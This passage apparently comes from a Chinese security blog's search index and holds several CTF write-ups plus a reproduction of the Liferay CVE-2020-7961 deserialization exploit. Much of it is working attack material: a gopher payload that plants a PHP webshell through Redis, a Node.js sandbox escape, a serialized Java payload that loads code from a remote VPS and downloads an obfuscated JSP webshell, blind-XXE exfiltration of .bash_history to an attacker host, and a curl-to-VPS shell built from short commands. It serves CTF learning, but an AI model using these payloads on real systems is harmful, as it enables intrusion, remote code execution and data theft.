'flag'\")\rf.write(s)\rf.write(str(gk1))\rf.write(str(gk))\rf.close()\r隔一会儿访问/flag.hint就有flag：\nEZ三剑客-EzWeb 考点：SSRF，file关键字绕过，gopher协议打redis未授权，redis写webshell\nSSRF学习链接\u003e\u003ehttps://hackmd.io/@Lhaihai/H1B8PJ9hX\n打开是一个提交URL的页面，输入127.0.0.1会回显\"别这样\"，盲猜SSRF；\n利用file协议尝试读取本机文件 file:///etc/passwd\r回显\"别这样\"；\n可以利用 file:/etc/passwd 绕过\n读取index源码：\nfile:/var/www/html/index.php\r得到：\nfunction curl($url){ $ch = curl_init();\rcurl_setopt($ch, CURLOPT_URL, $url);\rcurl_setopt($ch, CURLOPT_HEADER, 0);\recho curl_exec($ch);\rcurl_close($ch);\r}\rif(isset($_GET['submit'])){\r$url = $_GET['url'];\r//echo $url.\"\\n\";\rif(preg_match('/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is', $url,$match))\r{\r//var_dump($match);\rdie('别这样');\r}\rcurl($url);\r}\rif(isset($_GET['secret'])){\rsystem('ifconfig');\r}\r?\u003e\r可以看到，确实是ban掉了file:// dict 等关键字。\n但是flag貌似并不在这台机器上面；\n读取/etc/hosts和/proc/net/arp文件之后都没有发现什么有用的东西，ifconfig回显里面给出了本机的内网ip，于是去尝试爆破C段；\n利用bp的intruder模块爆破C段 发到intruder，设置Position和Payload，在xx.xx.xx.11发现了回显：\n继续尝试爆破端口，发现6379的redis报错（其实猜也能猜，一般就是3306和6379）\n利用gopher协议打内网未授权redis 之前说过ban了dict，我们这里还有gopher协议；\n直接往web路径写shell：\ngopher://173.169.113.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A\r直接前端提交：\n173.169.113.11/shell.php?cmd=cat%20/flag\r得到flag\n[GKCTF2020]EZ三剑客-EzNode 考点：NodeJs审计、settimeout函数漏洞\n参考\u003e\u003eGuoke师傅\n打开页面是个计算器，给了源码：\nconst express = require('express');\rconst bodyParser = require('body-parser');\rconst saferEval = require('safer-eval'); // 2019.7/WORKER1 找到一个很棒的库\rconst fs = require('fs');\rconst app = express();\rapp.use(bodyParser.urlencoded({ extended: false }));\rapp.use(bodyParser.json());\r// 2020.1/WORKER2 老板说为了后期方便优化\rapp.use((req, res, next) =\u003e {\rif (req.path === '/eval') {//如果请求路径是/eval，就执行\rlet delay = 60 * 1000;//定义一个变量delay\rconsole.log(delay);\rif (Number.isInteger(parseInt(req.query.delay))) {//如果请求参数delay是整数，就把传入的和之前定义取最大值复制给delay\rdelay = Math.max(delay, parseInt(req.query.delay));\r}\rconst t = setTimeout(() =\u003e next(), delay);//设置超时，如果超时就进入下一个路由\r// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事\rsetTimeout(() =\u003e {\rclearTimeout(t);\rconsole.log('timeout');\rtry {\rres.send('Timeout!');\r} catch (e) {\r}\r}, 1000);//超时一秒就就执行timeout\r} else {\rnext();\r}\r});\rapp.post('/eval', function (req, res) {\rlet response = '';\rif (req.body.e) {\rtry {\rresponse = saferEval(req.body.e);//可执行恶意代码\r} catch (e) {\rresponse = 'Wrong Wrong Wrong!!!!';\r}\r}\rres.send(String(response));\r});\r// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI\rapp.get('/source', function (req, res) {\rres.set('Content-Type', 'text/javascript;charset=utf-8');\rres.send(fs.readFileSync('./index.js'));\r});\r// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口\rapp.get('/version', function (req, res) {\rres.set('Content-Type', 'text/json;charset=utf-8');\rres.send(fs.readFileSync('./package.json'));\r});\rapp.get('/', function (req, res) {\rres.set('Content-Type', 'text/html;charset=utf-8');\rres.send(fs.readFileSync('./index.html'))\r})\rapp.listen(80, '0.0.0.0', () =\u003e {\rconsole.log('Start listening')\r});\r主要就是要看懂代码，大概意思就是：\n我们传入一个delay和原来的delay比较，取最大值，然后作为形参传给timeout这个函数，如果代码执行的时间超过了这个值，就执行eval；\n问题就出在这个settimeout函数上。\ninterger超过2147483647可以使int溢出 这里借用Guoke师傅的一张图：\n沙箱逃逸，原型链污染 https://xz.aliyun.com/t/7842\nGET传入：\n?delay=2147483648\rPOST：\ne=clearImmediate.constructor(\"return process;\")().mainModule.require(\"child_process\").execSync(\"cat /flag\").toString()\r得到flag；\nflag{e8e4454d-c127-4caf-89e2-86e266c83aa1}\n","description":"防灾科技学院主办的比赛","tags":["disable_functions","SSRF","Redis","NodeJS"],"title":"GKCTF2020复现","uri":"/posts/gkctf2020%E5%A4%8D%E7%8E%B0/"},{"categories":["note"],"content":"漏洞说明 Liferay是一个开源的Portal产品,提供对多个独立系统的内容集成,为企业信息、流程等的整合提供了一套完整的解决方案,和其他商业产品相比,Liferay有着很多优良的特性,而且免费,在全球都有较多用户。该漏洞是个反序列化导致的RCE，通过未授权访问其api传递json数据进行反序列化，危害较高\n影响范围 Liferay Portal 6.1、6.2、7.0、7.1、7.2\n环境搭建 漏洞环境：\nwindows 10\njre1.8.0_221\njdk1.8.0_221\ntomcat集成包：https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1 （我用的liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.tar.gz）\n启动环境 E:\\tmp\\liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761\\liferay-portal-7.2.0-ga1\\tomcat-9.0.17\\bin\u003e .\\catalina.bat run\r访问 http://localhost:8080/ 全部默认配置就可以\n漏洞利用 思路：构造恶意class文件-\u003e构造序列化-\u003e反序列化-\u003e加载VPS上面恶意evil.class文件-\u003e实现下载webshell\n构造恶意class文件 在VPS上面创建 LifExp.java（该写法为目标是Windows，运行计算器）-\u003e编译class文件\npublic class LifExp { static { try { String[] cmd = {\"cmd.exe\", \"/c\", \"calc.exe\"};//命令执行\rjava.lang.Runtime.getRuntime().\rexec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } }\r使用 javac .\\LifExp.java 生成class文件\n在当前目录使用 python -m SimpleHTTPServer 8000 监听8000端口启动一个wbe服务\n构造序列化 使用 marshalsec-0.0.3-SNAPSHOT-all.jar 文件进行序列化：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://你的IP:你的端口/ LifExp\r构造HTTP数据包 把 defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource= 后面的值替换为上面选中部分\nPOST /api/jsonws/invoke HTTP/1.1\rHost: 192.168.207.133:8080\rContent-Length: 1365\rContent-Type: application/x-www-form-urlencoded\rConnection: close\rcmd={\"/expandocolumn/add-column\":{}}\u0026p_auth=o3lt8q1F\u0026formDate=1585270368703\u0026tableId=1\u0026name=2\u0026type=3\u0026defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c6966457870740019687474703a2f2f35392e3131302e3135372e343a383030302f740003466f6f;\"}\r发包，不出意外会返回500\n但是计算器是弹出来了；\n别看他只是一个小小的计算器，但是他的威力是无穷的，因为你可以弹一万个计算器执行其他命令来对靶机进行攻击，比如下载一个webshell\n出网下载webshell 这个得免杀JSPshell，别问，问就是直接给你ban了，之前用一个一句话，除了whoami都不能来事儿。\n免杀jspshell地址：https://www.jianshu.com/p/12dce12b2036\nVPS上面构造一个txt：\n\u003c%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %\u003e\r\u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e\r\u003c%\rif(request.getParameter(\"cmd\")!=null){\rBASE64Decoder decoder = new BASE64Decoder();\rClass rt = Class.forName(new String(decoder.decodeBuffer(\"amF2YS5sYW5nLlJ1bnRpbWU=\")));\rProcess e = (Process)\rrt.getMethod(new String(decoder.decodeBuffer(\"ZXhlYw==\")), String.class).invoke(rt.getMethod(new\rString(decoder.decodeBuffer(\"Z2V0UnVudGltZQ==\"))).invoke(null, new\rObject[]{}), request.getParameter(\"cmd\") );\rjava.io.InputStream in = e.getInputStream();\rint a = -1;\rbyte[] b = new byte[2048];\rout.print(\"\u003cpre\u003e\");\rwhile((a=in.read(b))!=-1){\rout.println(new String(b));\r}\rout.print(\"\u003c/pre\u003e\");\r}\r%\u003e\r替换编译下面的java：\npublic class LifExp { static { try { String[] cmd = {\"cmd.exe\", \"/c\", \"certutil.exe -urlcache -split -f\", \"http://IP:端口/jspshell.txt\", \"..\\\\webapps\\\\ROOT\\\\jspshell.jsp\"};\rjava.lang.Runtime.getRuntime().\rexec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } }\r第四行，Windows下使用certutil.exe可以实现文件下载，curl功能。\n因为当前靶机执行命令的路径是 tomcat\\bin  所以我们下载webshell的时候，一定要下载到index.jsp相同路径便于我们访问，也就是 tomcat-9.0.17\\webapps\\ROOT 。\n执行了命令之后，我们在这个文件夹下面已经可以看到我们的shell了：\n而这个时候我们已经可以正常访问shell了：\n?cmd=cmd /c 命令 记得url编码；\n如果我们要查看桌面的某个文件，比如一个叫做flag.txt的文件，直接执行 type %userprofile%\\desktop\\flag*\n原理剖析 太菜了，不会。\nhttps://www.freebuf.com/column/236744.html\nhttps://www.anquanke.com/post/id/203870\n","description":"由DozerCTF2020学习CVE-2020-7961","tags":["Java反序列化","CVE"],"title":"CVE-2020-7961 Liferay Portal 反序列化-复现","uri":"/posts/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/"},{"categories":["ctf_writeup"],"content":"又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了\n sqli-labs 0 考点：URL二次编码，堆叠注入\n堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。\n查看库名：\n?id=1%2527;show%20databases;%23 查看表名：\n?id=1%2527;show%20tables;%23\r查看表的第一条数据：\n?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 flag{594cb6af684ad354b4a59ac496473990}\n白给的反序列化 考点：PHP反序列化\n开题送码：\n\u003c?php\rclass home\r{\rprivate $method;\rprivate $args;\rfunction __construct($method, $args)\r{\r$this-\u003emethod = $method;\r$this-\u003eargs = $args;\r}\rfunction __destruct()\r{\rif (in_array($this-\u003emethod, array(\"mysys\"))) {\rcall_user_func_array(array($this, $this-\u003emethod), $this-\u003eargs);\r}\r}\rfunction mysys($path)\r{\rprint_r(base64_encode(exec(\"cat $path\")));\r}\rfunction waf($str)\r{\rif (strlen($str) \u003e 8) {\rdie(\"No\");\r}\rreturn $str;\r}\rfunction __wakeup()\r{\r$num = 0;\rforeach ($this-\u003eargs as $k =\u003e $v) {\r$this-\u003eargs[$k] = $this-\u003ewaf(trim($v));\r$num += 1;\rif ($num \u003e 2) {\rdie(\"No\");\r}\r}\r}\r}\rif ($_GET['path']) {\r$path = @$_GET['path'];\runserialize($path);\r} else {\rhighlight_file(__FILE__);\r}\r?\u003e\r核心是在 mysys 函数，可以返回base64编码之后的exec内容；\n而 __destruct 里面首先是一个 in_array 的判断，如果 $this-\u003emethod 的值是在一个数组里面的话，就执行 call_user_func_array ，而这个数组只有一个元素那就是 mysys ，所以我们method就传入mysys字符串就行。\n至于call_user_func_array，PHP手册是这样写的：\nmixed call_user_func_array ( callable $callback , array $param_arr )\r把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。\rcallback\r被调用的回调函数。\rparam_arr\r要被传入回调函数的数组，这个数组得是索引数组。\r那么我们只需要给 $args 赋一个数组就行了；\n'''\r题目源码\r'''\r$pop = new home('mysys',array('flag.php'));\recho serialize($pop);\r得到 O:4:\"home\":2:{s:12:\" home method\";s:5:\"mysys\";s:10:\" home args\";a:1:{i:0;s:8:\"flag.php\";}} 注入private对象加个%00就行。\npayload:\n?path=O:4:\"home\":2:{s:12:\"%00home%00method\";s:5:\"mysys\";s:10:\"%00home%00args\";a:1:{i:0;s:8:\"flag.php\";}}\rflag{j4nc920fm8b2z0r2mc7dsf87s6785a675sa776vd}\n简单域渗透-flag1 考点：CVE-2020-7961 Liferay Portal 反序列化\n请移步本站：CVE-2020-7961 Liferay Portal 反序列化-复现\nsvgggggg! 考点：XXE盲打，SSRF，sqli写shell\n打开题目，叫我们给一个URL，然后check这个URL指向的file是不是svg图片\n什么是SVG？  SVG 指可伸缩矢量图形 (Scalable Vector Graphics) SVG 用来定义用于网络的基于矢量的图形 SVG 使用 XML 格式定义图形 SVG 图像在放大或改变尺寸的情况下其图形质量不会有所损失 SVG 是万维网联盟的标准 SVG 与诸如 DOM 和 XSL 之类的 W3C 标准是一个整体  由于SVG是基于XML的矢量图，因此可以支持Entity（实体）功能。\n我们自然而然地想到了XXE。\n利用SVG进行XXE攻击 我从网上搜索了一个SVG图片的源码，改装了一下，在VPS上面命名为 1.svg ：\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\r\u003c!DOCTYPE fortiguard [ \u003c!ENTITY lab \"HELLO\"\u003e\r]\u003e\r\u003csvg xmlns=\"http://www.w3.org/2000/svg\" height=\"200\" width=\"200\"\u003e\r\u003ctext y=\"20\" font-size=\"20\"\u003e\u0026lab;\u003c/text\u003e\t\u003c/svg\u003e\r提交地址，我们发现我们的实体已经起作用了（这里只是因为挡住了，但是F12可以看到）\n那么大致就能实锤是XXE；\n尝试直接读取文件：\n1.svg\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\r\u003c!DOCTYPE fortiguard [ \u003c!ENTITY lab SYSTEM \"file:///home/r1ck/.bash_history\"\u003e\r]\u003e\r\u003csvg xmlns=\"http://www.w3.org/2000/svg\" height=\"200\" width=\"200\"\u003e\r\u003ctext y=\"20\" font-size=\"20\"\u003e\u0026lab;\u003c/text\u003e\r\u003c/svg\u003e\r当然不可能这么简单，页面虽然正常返回信息，但是我们并不能直接读到我们想要的东西；\n无回显，但是又是XXE，我们又自然地想到了XXE盲打，也就是通过加载外部一个dtd文件，然后把读取结果以HTTP请求的方式发送到自己的VPS。\n构造 entity.svg :\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\r\u003c!DOCTYPE fortiguard [ \u003c!ENTITY lab SYSTEM \"file:///home/r1ck/.bash_history\"\u003e\r\u003c!ENTITY % file SYSTEM \"file:///home/r1ck/.bash_history\"\u003e\r\u003c!ENTITY % dtd SYSTEM \"http://IP:端口/1.dtd\"\u003e\r%dtd;\r%send;\r]\u003e\r\u003csvg xmlns=\"http://www.w3.org/2000/svg\" height=\"200\" width=\"200\"\u003e\r\u003ctext y=\"20\" font-size=\"20\"\u003e\u0026lab;\u003c/text\u003e\r\u003c/svg\u003e\r构造 1.dtd ：\n\u003c!ENTITY % all\r\"\u003c!ENTITY \u0026#x25; send SYSTEM 'http://IP:端口/?%file;'\u003e\"\r\u003e\r%all;\r发送 entity.svg 地址；\n我们可以看到dtd文件实际上已经被加载了，但是却没有收到读取文件之后的请求\n判断问题出在读文件那一步，但是倘若我们读取的文件是一个不存在的文件，比如file:///xxx/xx.x，那么我们发送svg文件地址之后，页面是没有回显内容的； 但是如果我们读取的是一个存在的文件，页面会有回显内容。\n那么我们可以推测，读文件是读到了，但是在发包的时候出了问题。\n问题就出在换行和空格。\n因为是GET请求发送到VPS，所以我们不能有换行和空格，不然就会400。\n解决方法当然是base64。xml解析器支持使用php://filter进行编码\n修改 entity.svg :\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\r\u003c!DOCTYPE fortiguard [ \u003c!ENTITY lab SYSTEM \"file:///home/r1ck/.bash_history\"\u003e\r\u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history\"\u003e\r\u003c!ENTITY % dtd SYSTEM \"http://59.110.157.4:8000/1.dtd\"\u003e\r%dtd;\r%send;\r]\u003e\r\u003csvg xmlns=\"http://www.w3.org/2000/svg\" height=\"200\" width=\"200\"\u003e\r\u003ctext y=\"20\" font-size=\"20\"\u003e\u0026lab;\u003c/text\u003e\r\u003c/svg\u003e\r读到了.bash_history：\ncd /app\rphp -S 0.0.0.0:8080\r明显是SSRF打内网；\n利用XXE打SSRF 修改 entity.svg ，得到 127.0.0.1:8080 的源码：\n\u003c!doctype html\u003e\r\u003chtml\u003e\r\u003chead\u003e\r\u003cmeta charset=\"UTF-8\"\u003e\r\u003ctitle\u003eindex\u003c/title\u003e\r\u003c/head\u003e\rHi!\rYou Find Me .\rFlag is nearby.\r\u003cbody\u003e\r\u003c/body\u003e\r\u003c/html\u003e\rArray\r(\r[id] =\u003e 1\r[name] =\u003e test\r)\r可以看到是个sqli；\n根据hint，我们需要直接getshell，测出来没有堆叠，但是可以联合查询\n这里我们使用union select直接写一个shell到/app目录；\n但是到了这里遇到了玄学原因，php一句话写进去会莫名其妙消失，等开源之后本地复现；\n","description":"金陵科技学院主办的CTF比赛","tags":["XXE","SQLi"],"title":"DozerCTF2020_web","uri":"/posts/dozerctf2020_web/"},{"categories":["note"],"content":"这个东西起源于HITCON CTF 2017的一道题，高校战疫Hack Me也曾经出现过，最近突然做到了来说一下\n参考：https://www.anquanke.com/post/id/87203\n 源码 五字版本\n\u003c?php\r$sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']);\r@mkdir($sandbox);\r@chdir($sandbox);\rif (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 5) {\r@exec($_GET['cmd']);\r} else if (isset($_GET['reset'])) {\r@exec('/bin/rm -rf ' . $sandbox);\r}\rhighlight_file(__FILE__);\r四字版本：\n\u003c?php\r$sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']);\r@mkdir($sandbox);\r@chdir($sandbox);\rif (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 4) {\r@exec($_GET['cmd']);\r} else if (isset($_GET['reset'])) {\r@exec('/bin/rm -rf ' . $sandbox);\r}\rhighlight_file(__FILE__);\r预备知识 在cmd长度小于5（4）个字符的时候用 exec 函数执行系统命令，不过 exec 函数是默认没有回显的，这里我们就只能盲打。\nLinux用\\连接多行命令 Linux系统中支持用 \\ 字符来分割一个多行命令，在一个文件中即使有无法识别的命令，报错，也不会影响其他正常命令执行\n用两个字符在Linux下创建文件 ls的文件排序和ls -t的文件排序 ls\nls -t\n可以看到， ls 是按照alphabet来排序的， ls -t 是按照创建时间的顺序来排序的\n分析 我们在原文可以看到，作者通过了创建文件，利用文件名构造curl命令，然后用ls命令追加到一个文件，再用sh命令去执行它\n思路显然是非常的爆炸，但是我经过复现之后，发现这种构造很困难，作者利用了IP的16进制、8进制和长整型形式来构造文件名，而且分割之后恰恰又是满足alphabet的，而VPS的ip是固定不变的，想要找一个这样的IP需要一定的巧合。\n并且原作者playload的到数第三行：\n利用了A文件本身就在ls命令回显的特性，我构造到这里，很难受，这个技巧太高。\nls -t 、 rev 、 * 命令结合使用回避alphabet 而在HITCON2017的四字版本里面，有师傅利用 ls -t 和 rev 和 * 避开了这个问题，不过思路也是相当的巧妙\nimport requests\rimport time\rhost = '127.0.0.1'\rplayload = [\r# generate \"g\u003e ht- sl\" to file \"v\"\r'\u003edir',\r'\u003eg\\\u003e',\r'\u003eht-',\r'\u003esl',\r'*\u003ev',\r# reverse file \"v\" to file \"h\", content \"ls -th \u003eg\"\r'\u003erev',\r'*v\u003eh',\r# generate \"curl 59.xx0.x5x.4\u003ep.php\"\r'\u003e\\;\\\\',\r'\u003ep',\r'\u003eph\\\\',\r'\u003ep.\\\\',\r'\u003e\\\u003e\\\\',\r'\u003e4\\\\',\r'\u003e5x.\\\\',\r'\u003e0.x\\\\',\r'\u003exx\\\\',\r'\u003e59.\\\\',\r'\u003e\\ \\\\',\r'\u003erl\\\\',\r'\u003ecu\\\\',\r'sh h',\r'sh g',\r]\rfor i in playload:\rcmd = i\rr = requests.get(host + '?cmd=' + i)\r#print(r.text)\rtime.sleep(0.2)\r这是5字版本的exp，4字版本只需要改一下自己的IP。\n其中 * 这个命令很有意思\n所以这个方案明显比原来的利用alphabet的排序来写shell好多了\n","description":"由一道CTF题目探究绕过4，\t5个字符限制getshell","tags":["RCE bypass"],"title":"绕过4-5个字符限制getshell","uri":"/posts/%E7%BB%95%E8%BF%874-5%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6getshell/"},{"categories":["ctf_writeup"],"content":"武汉大学的CTF，难的简单的都有，最近比赛是真滴多，打完金盆洗手了\n Easy_sqli 考点：bool盲注，双写绕过\n简单，没啥好讲的\n#wh1sper\rimport requests\rhost = 'http://218.197.154.9:10011/login.php#'\rdef mid(bot, top):\rreturn (int)(0.5 * (top + bot))\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\rbabyselect = '(seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w)'#\rselect = \"1' oorr ascii(substr(\"+babyselect+\",{},1))\u003e{} #\".format(j, mid(bot, top))\rdata = {\"user\": select, \"pass\": \"a\"}\rr = requests.post(url=host, data=data)\r#print(data)\rif 'Login success!' in r.text: # 成功\rif top - 1 == bot: # top和bot相邻，说明name是top\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top) # 成功就上移bot\relse: # 失败\rif top - 1 == bot: # top和bot相邻，加上失败，说明name是bot\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top) # 失败就下移top\rif __name__ == '__main__':\rsqli()\rWHUCTF{r3lly_re11y_n0t_d1ffIcult_yet??~}\nezphp 考点：%0a绕过preg_match、md5爆破、反序列化字符逃逸\n都是原题：\n\u003c?php\rerror_reporting(0);\rhighlight_file(__file__);\r$string_1 = $_GET['str1'];\r$string_2 = $_GET['str2'];\r//1st\rif($_GET['num'] !== '23333' \u0026\u0026 preg_match('/^23333$/', $_GET['num'])){\recho '1st ok'.\"\u003cbr\u003e\";\r}\relse{\rdie('会代码审计嘛23333');\r}\r//2nd\rif(is_numeric($string_1)){\r$md5_1 = md5($string_1);\r$md5_2 = md5($string_2);\rif($md5_1 != $md5_2){\r$a = strtr($md5_1, 'pggnb', '12345');\r$b = strtr($md5_2, 'pggnb', '12345');\rif($a == $b){\recho '2nd ok'.\"\u003cbr\u003e\";\r}\relse{\rdie(\"can u give me the right str???\");\r}\r} else{\rdie(\"no!!!!!!!!\");\r}\r}\relse{\rdie('is str1 numeric??????');\r}\r//3nd\rfunction filter($string){\rreturn preg_replace('/x/', 'yy', $string);\r}\r$username = $_POST['username'];\r$password = \"aaaaa\";\r$user = array($username, $password);\r$r = filter(serialize($user));\rif(unserialize($r)[1] == \"123456\"){\recho file_get_contents('flag.php');\r}\r第一关，num=23333%0a，NCTF和MRCTF出现过\n第二关，见本站奇怪的MD5，理解strtr的功能，exp跑1分钟出，md5(11230178)=0e732639146814822596b49bb6939b97\n第三关，反序列化字符逃逸，参考miniLCTF、安恒4月赛\nezcmd 考点：$IFS绕空格，\\分割关键字，变量绕过flag匹配\n\u003c?php\rif(isset($_GET['ip'])){\r$ip = $_GET['ip'];\rif(preg_match(\"/\\\u0026|\\/|\\?|\\*|\\\u003c|[\\x{00}-\\x{1f}]|\\\u003e|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match)){\recho preg_match(\"/\\\u0026|\\/|\\?|\\*|\\\u003c|[\\x{00}-\\x{20}]|\\\u003e|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match);\rdie(\"fxck your symbol!\");\r} else if(preg_match(\"/ /\", $ip)){\rdie(\"no space!\");\r} else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip)){\rdie(\"no flag\");\r} else if(preg_match(\"/tac|rm|echo|cat|nl|less|more|tail|head/\", $ip)){\rdie(\"cat't read flag\");\r}\r$a = shell_exec(\"ping -c 4 \".$ip); echo \"\u003cpre\u003e\";\rprint_r($a);\r}\rhighlight_file(__FILE__);\r?\u003e\r参考：https://cloud.tencent.com/developer/article/1599149\nplayload:\n?ip=0.0.0.0;a=g;b=fla;ca\\t$IFS$b$a.php\rwhuctf{11041f3d-3fbb-4dfd-8f27-31788300b54c}\nezinclude 考点：文件包含参数爆破\n打开题目，扫目录到了info.php，本来以为是临时文件包含，结果。。\n在contact.php提交表单，跳转到/thankyou.php，里面看到了几个参数，直接爆破出file参数，\nfile=php://filter/read=convert.base64-encode/resource=flag.php\r得到base64编码的flag\nwhuctf{N0w_y0u_kn0w_file_inclusion}\nEasy_unserialize 考点：文件包含、Phar反序列化\nphar学习链接\n\u003e\u003ehttps://www.freebuf.com/column/198945.html\n\u003e\u003ehttps://paper.seebug.org/680/\n题目名称是unserialize，不过打开却是一个文件上传页面，上传和反序列化结合的我只能想到phar反序列化，但是由于以前做题直接跳过了这个知识点，不够熟悉，比赛的时候出了一点小故障没做出来。\n在主页的源码里面可以看到提示 \u003c!-- flag.php --\u003e ，分别访问 upload.php 和 view.php 然后回头看抓包，发现了有一个 acti0n=upload 和 acti0n=view 的302重定向，放到bp，用伪协议可以读取两个页面的源码：\n?acti0n=pHp://Filter/read=convert.Base64-encode/resource=upload.php\r?acti0n=pHp://Filter/read=convert.Base64-encode/resource=view.php\r注意他过滤了一些关键字，需要大小写绕过。\n得到了源码之后就是审计了，在 upload.php 里面也能看到这样一段：\nif(preg_match('/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i', $extension) === 0) {\rdie(\"\u003cp align=\\\"center\\\"\u003eYou can't upload this kind of file!\u003c/p\u003e\");\r}\r也间接（直接）暗示（明示）了我们phar的操作。\n在view.php里面看到：\nif (isset($_POST['show'])) {\r$file_name = $_POST['show'];\r$ins-\u003eshow_img($file_name);\r}\rif (isset($_POST['delete'])) {\r$file_name = $_POST['delete'];\r$ins-\u003edelete_img($file_name);\r}\r转到声明：\n class View\r{\rpublic $dir;\rprivate $cmd;\r…………\r…………\rfunction show_img($file_name) {\r$name = $file_name;\r$width = getimagesize($name)[0];\r$height = getimagesize($name)[1];\r$times = $width / 200;\r$width /= $times;\r$height /= $times;\r$template = \"\r\u003cimg style=\\\"clear: both;display: block;margin: auto;\\\" src=\\\"$this-\u003edir$name\\\" alt=\\\"$file_name\\\" width = \\\"$width\\\" height = \\\"$height\\\"\u003e\r\";\recho $template;\r}\rfunction delete_img($file_name) {\r$name = $file_name;\rif (file_exists($name)) {\r@unlink($name);\rif(!file_exists($name)) {\recho \"\u003cp align=\\\"center\\\" style=\\\"font-weight: bold;\\\"\u003e成功删除! 3s后跳转\u003c/p\u003e\";\rheader(\"refresh:3;url=view.php\");\r} else {\recho \"Can not delete!\";\rexit;\r}\r} else {\recho \"\u003cp align=\\\"center\\\" style=\\\"font-weight: bold;\\\"\u003e找不到这个文件! \u003c/p\u003e\";\r}\r}\rfunction __destruct() {\reval($this-\u003ecmd);\r}\r}\rfunction delete_img 里面有 file_exists() 可以触发phar反序列化，那么我们就开始构造phar文件：\n\u003c?php\rclass View\r{\rpublic $dir;\rprivate $cmd = 'show_source(\"/var/www/html/flag.php\");';\r}\r@unlink(\"phar.phar\");\r$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\r$phar-\u003estartBuffering();\r$phar-\u003esetStub(\"GIF89a\".\"\u003c?php __HALT_COMPILER(); ?\u003e\"); //设置stub\r$o = new view();\r$phar-\u003esetMetadata($o); //将自定义的meta-data存入manifest\r$phar-\u003eaddFromString(\"test.jpg\", \"test\"); //添加要压缩的文件\r//签名自动计算\r$phar-\u003estopBuffering();\r?\u003e\r由于upload里面ban了一些函数，题目又提示了flag.php，我们就直接show_source\n运行，生成phar文件，上传。\n在 view.php POST请求：\ndelete=phar://phar.phar\r直接得到flag.php的源码\nWHUCTF{Phar_1s_Very_d@nger0u5}\n","description":"","tags":["SQLi","phar","RCE bypass"],"title":"WHUCTF2020","uri":"/posts/whuctf2020/"},{"categories":["ctf_writeup"],"content":"Web2 考点：redis弱口令，python反序列化\nBUU上面的环境需要 Shadowsocks 代理才能访问，配置这个都搞了半天（tcl\n下载配置shadowsocks sudo apt-get install 